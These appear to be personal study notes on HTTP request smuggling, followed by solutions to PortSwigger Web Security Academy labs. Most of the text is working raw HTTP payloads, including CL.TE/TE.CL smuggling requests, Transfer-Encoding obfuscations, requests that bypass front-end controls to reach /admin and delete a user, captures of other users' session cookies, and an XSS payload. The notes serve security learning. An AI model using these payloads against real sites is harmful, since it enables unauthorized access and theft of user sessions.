# HTTP request smuggling

IT is the method of interfering with the way a web site processes sequence of HTTP requests that are received from one user or more.

Request smuggling is primarily dependent of HTTP/1 requests. However depending upon the backed used in the server HTTP/2 may be vulnerable as well.


Here the attacker sends a request to the frontend server (Proxy or load balancer) which is then forwarded by the frontend server to the backend while it gets interpreted on the start of the next request.

There are two header on HTTP/1 `Content-Length` and `Transfer-Encoding` 
Here the `Content-Length` defines the length of a specific content that should be transfered from client to Frontned server to backend server 
where as `Transfer-Encoding` is using to send the data in the form of chunk size.

Now if the front end server usages `Content-Length` But the backend server usages `Transfer-Encoding` there there might be a case where there is ambiquity between the successive of a request which could lead to the smuggling of tht HTTP request.


Methods to perform HTTP request smuggling 


1. **CL.TE** - Frontend serve accepts Content Length backend server accepts Transfer encoding.
2. **TE.CL** - Frontend server accepts Transfer Encoding and backend serve accepts Content lenght
3. the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way


## CL.TE vulnerabilities

We can perform a simple HTTP request smuggling attack as follows

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```


The content of the request length is 13 till the end of SMUGGLED, Now the Transfer-Encoding treats the body like chucked which is terminated by 
```0\r\n\r\n```. Now the remaining part SMUGGLED will be called on the next request and HTTP request has been smuggled.



## TE.CL vulnerabilities 

The `front-end` server uses the `Transfer-Encoding` header and the `back-end` server uses the `Content-Length` header

The the HTTP request smuggling attack looks like 

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

```
8\r\n        ← chunk size in hex = 8 bytes
SMUGGLED\r\n ← 8 bytes of data
0\r\n        ← end of chunks
\r\n         ← empty line to terminate chunked encoding

```


## TE.TE behavior: obfuscating the TE header 
The `front-end` and `back-end` servers both support the `Transfer-Encoding` header, but **one of the servers can be induced not to process** it by obfuscating the header in some way.

There are potentially endless ways to obfuscate the Transfer-Encoding header

```
Transfer-Encoding: xchunked

Transfer-Encoding : chunked

Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked

[space]Transfer-Encoding: chunked

X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

To uncover a TE.TE vulnerability, it is necessary to find some variation of the `Transfer-Encoding` header such that only one of the front-end or back-end servers processes it, while the other server ignores it.

## Finding HTTP request smuggling vulnerabilities 
The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present

### Finding CL.TE vulnerabilities using timing techniques
If the application usages Content lenght on the frontend and Transfer encoding in the backend the a request like this will cause a noticable time delay.


```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 4

1
A
X
```


Here the Content length is 4 and the data chunk has not yet been termiated as a result the backend server will wait for a noticable period of time.


## Finding TE.CL vulnerabilities using timing techniques

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

If the application usages Transfer chuncked in frontend and Content Length in backend then request like this will suggest the frontend that the chunk has been ended after 

```
0\r\n
\r\n
```

Anx *X* will be omitted as and since the backend server usages Content-Length it will wait for the complete data to arrive and 

```
0\r\n
\r\n
```
has only 4 byte of data.


## Confirming HTTP request smuggling vulnerabilities using differential responses

Sending two requests in a quick succession which can show different in content may confirm the vulnerability.

1. An "attack" request that is designed to interfere with the processing of the next request
2. A "normal" request.

A normal request may look like 

```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```

The request may normally recieve HTTP status code 200 


### Confirming CL.TE vulnerabilities using differential responses

To confirm the vulnerability we could send an attack request like


```
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x
```

If the attack is successful, then the last two lines of this request are treated by the back-end server as belonging to the next request that is received


```
GET /404 HTTP/1.1
Foo: xPOST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```


## Exploiting HTTP request smuggling vulnerabilities
Using HTTP request smuggling to bypass front-end security controls

Suppose the current user is permitted to access /home but not /admin. They can bypass this restriction using the following request smuggling attack: 


```
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

## Revealing front-end request rewriting

The front-end server performs some rewriting of requests before they are forwarded to the back-end server, typically by adding some additional request headers

*  Find a POST request that reflects the value of a request parameter into the application's response. 
*  Shuffle the parameters so that the reflected parameter appears last in the message body. 
*  Smuggle this request to the back-end server, followed directly by a normal request whose rewritten form you want to reveal. 


*Suppose an application has a login function that reflects the value of the email parameter:*
```
POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 28

email=wiener@normal-user.net
```

This results in a response containing the following: 

```html
<input id="email" value="wiener@normal-user.net" type="text">
```

Here you can use the following request smuggling attack to reveal the rewriting that is performed by the front-end server: 


```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Transfer-Encoding: chunked

0

POST /login HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

email=POST /login HTTP/1.1
Host: vulnerable-website.com
...
```

The requests will be rewritten by the front-end server to include the additional headers, and then the back-end server will process the smuggled request and treat the rewritten second request as being the value of the email parameter. It will then reflect this value back in the response to the second request: 

```
<input id="email" value="POST /login HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For: 1.3.3.7
X-Forwarded-Proto: https
X-TLS-Bits: 128
X-TLS-Cipher: ECDHE-RSA-AES128-GCM-SHA256
X-TLS-Version: TLSv1.2
x-nr-external-service: external
...
```

## Bypassing client authentication

If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. These may include session tokens or other sensitive data submitted by the user. Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on. 

```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 154
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
```

Example request may look a like
```
GET / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Content-Length: 330

0

POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
```

Here the body should be of 400 bytes long, but we are only providing 144 bytes. Now either the backend server will wait till the timeout or send the request from another request if it get's one. So if another request is received then it should look like.


```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO

csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
... 
```
As the start of the victim's request is contained in the comment parameter, this will be posted as a comment on the blog, enabling you to read it simply by visiting the relevant post. 

## Using HTTP request smuggling to exploit reflected XSS 

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 63
Transfer-Encoding: chunked

0

GET / HTTP/1.1
User-Agent: <script>alert(1)</script>
Foo: X
```

# LAB


## Lab: HTTP request smuggling, basic CL.TE vulnerability

1. Open the page 
2. Change the request method to POST 
3. Now Change the protocol from Inspector tab
4. From Repeter option you can uncheck the `update content length`
5. Now Send the following requests

```
POST / HTTP/1.1\r\n
Host: 0a41008d0328120e80911710009200d3.web-security-academy.net\r\n
Cookie: session=jU9rN8a7QE25yiLafTP2Aa2O6Cu6QZOf\r\n
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0\r\n
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n
Accept-Language: en-US,en;q=0.5\r\n
Accept-Encoding: gzip, deflate, br\r\n
Upgrade-Insecure-Requests: 1\r\n
Sec-Fetch-Dest: document\r\n
Sec-Fetch-Mode: navigate\r\n
Sec-Fetch-Site: none\r\n
Sec-Fetch-User: ?1\r\n
Priority: u=0, i
Te: trailers\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
G
```

Here the `Content-Length` is 6 which is equivalent of 
```
0\r\n
\r\n
```
And the backend accepts Transfer encoding where the G get's missed and get's appended on next request.



## Lab: HTTP request smuggling, basic TE.CL vulnerability

```
POST / HTTP/1.1
Host: 0a33009403061ede808cc10300f30060.web-security-academy.net
Cookie: session=Yo8PwnP8XfFoThwQj6sEZBAgoiUkbb6J
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 3
Transfer-Encoding: chunked
\r\n
1\r\n
G\r\n
0\r\n
\r\n

```

Sending this request solves the lab


## Lab: HTTP request smuggling, obfuscating the TE header

```
POST / HTTP/1.1
Host: 0ad500b403463fa481a67f5f00370009.web-security-academy.net
Cookie: session=iVTVnRQxl4P3vLiDcyWqnfFHO7xA5MYg
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=1
0


```

As the frontend is only accepting either GET or POST request We crafted a new HTTP request.


## Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

```
POST / HTTP/1.1
Host: 0aa500120392959280fc4eb500ff004d.web-security-academy.net
Cookie: session=9QbCn4iCX3kyvd1X26G7HsZRpv8HtGhi
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Type: application/x-www-form-urlencoded
Content-Length: 35
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
X-Ignore: X
```



X-Ignore: X is just a filler header to make the smuggled GET /404 request valid. It ensures:

The backend HTTP parser sees a legitimate request.

You don't rely on any real headers (like Host), which might trigger validation or WAF rules.





## Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses


```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```


## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

Send the following request at first 


```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

The request will not be successful as it is not comming from the internal 


```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```

Now we have requested the `Host to localhost` but it's not accepted as there are two host on the request now we can send something like


```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Here we choosed chunck of data where Host has been ignore.

```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

Sending this request solved the lab.



## Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

```
POST / HTTP/1.1
Host: 0ae6006a032b81158070537a000f00a5.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
## Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting


```
POST / HTTP/1.1
Host: 0a35004a03751c2681f0a20e007200c6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 124
Transfer-Encoding: chunked

0

POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 200
Connection: close

search=test
```

```
POST / HTTP/1.1
Host: 0a35004a03751c2681f0a20e007200c6.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 166
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
X-FHGwVq-Ip: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
Connection: close

x=1
```


